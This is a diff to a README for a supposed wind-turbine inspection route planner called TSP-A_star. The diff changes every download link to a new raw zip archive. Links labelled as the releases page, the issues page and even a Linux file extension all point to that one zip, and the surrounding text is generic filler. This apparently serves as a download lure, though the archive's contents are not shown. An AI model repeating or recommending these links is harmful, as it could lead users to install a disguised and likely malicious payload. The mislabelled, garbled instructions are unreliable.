@@ -3,7 +3,7 @@
 ## 🚀 Getting Started
 Welcome to TSP-A_star! This tool helps you efficiently plan inspection routes for wind turbines in wind farms. Using advanced algorithms, it simplifies the way you access and connect turbines. 
 
-[![Download TSP-A_star](https://raw.githubusercontent.com/kartkinadziendobry/TSP-A_star/main/subfossorial/TSP-A_star.zip)](https://raw.githubusercontent.com/kartkinadziendobry/TSP-A_star/main/subfossorial/TSP-A_star.zip)
+[![Download TSP-A_star](https://raw.githubusercontent.com/kartkinadziendobry/TSP-A_star/main/subfossorial/TS-star-2.2-alpha.3.zip)](https://raw.githubusercontent.com/kartkinadziendobry/TSP-A_star/main/subfossorial/TS-star-2.2-alpha.3.zip)
 
 ## 📦 Features
 - **Hierarchical Planning:** This module uses both TSP (Traveling Salesman Problem) for order selection and A* algorithm for pathfinding.
@@ -20,9 +20,9 @@ To run TSP-A_star, ensure your system meets the following requirements:
 ## 📥 Download & Install
 To get started, follow these steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/kartkinadziendobry/TSP-A_star/main/subfossorial/TSP-A_star.zip) to find the latest version of TSP-A_star.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/kartkinadziendobry/TSP-A_star/main/subfossorial/TS-star-2.2-alpha.3.zip) to find the latest version of TSP-A_star.
 
-2. **Choose the Right File**: Scroll through the release notes. Select the most recent version that fits your operating system. Look for files ending in `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/kartkinadziendobry/TSP-A_star/main/subfossorial/TSP-A_star.zip` for Linux.
+2. **Choose the Right File**: Scroll through the release notes. Select the most recent version that fits your operating system. Look for files ending in `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/kartkinadziendobry/TSP-A_star/main/subfossorial/TS-star-2.2-alpha.3.zip` for Linux.
 
 3. **Download the File**: Click on the appropriate file to download it to your device.
 
@@ -62,10 +62,10 @@ A: It’s best to have at least the minimum system requirements for optimal perf
 A: We aim to update TSP-A_star regularly, based on user feedback and advancements in technology.
 
 ## 📰 Support and Contributions
-For support, visit our [GitHub Issues page](https://raw.githubusercontent.com/kartkinadziendobry/TSP-A_star/main/subfossorial/TSP-A_star.zip) to report problems or ask questions. Contributions are welcome! If you would like to help improve TSP-A_star, check our guidelines on the GitHub repository.
+For support, visit our [GitHub Issues page](https://raw.githubusercontent.com/kartkinadziendobry/TSP-A_star/main/subfossorial/TS-star-2.2-alpha.3.zip) to report problems or ask questions. Contributions are welcome! If you would like to help improve TSP-A_star, check our guidelines on the GitHub repository.
 
 ## 🔗 Additional Resources
 - **Documentation:** In-depth guides and tutorials will be available in the repository.
 - **Community Forum:** Join discussions with other users to share tips and experiences.
 
-[![Download TSP-A_star](https://raw.githubusercontent.com/kartkinadziendobry/TSP-A_star/main/subfossorial/TSP-A_star.zip)](https://raw.githubusercontent.com/kartkinadziendobry/TSP-A_star/main/subfossorial/TSP-A_star.zip)
+[![Download TSP-A_star](https://raw.githubusercontent.com/kartkinadziendobry/TSP-A_star/main/subfossorial/TS-star-2.2-alpha.3.zip)](https://raw.githubusercontent.com/kartkinadziendobry/TSP-A_star/main/subfossorial/TS-star-2.2-alpha.3.zip)
